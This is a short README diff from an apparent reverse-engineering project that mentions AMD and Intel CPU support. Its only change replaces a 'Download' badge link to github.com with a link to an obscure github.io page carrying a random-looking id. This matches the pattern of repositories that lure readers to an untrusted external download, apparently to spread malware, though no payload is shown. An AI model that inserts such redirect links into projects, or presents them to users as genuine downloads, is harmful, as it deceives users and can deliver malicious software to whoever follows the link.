@@ -18,7 +18,7 @@ The team started this project with the purpose of learning reverse engineering h
 We are sure that people will enjoy this kind of stuff and we are planning to improve it as much as possible.
 
 
-<div align="center"><a href="https://github.com"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
+<div align="center"><a href="https://lizequi.github.io/id/px91kj8f"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
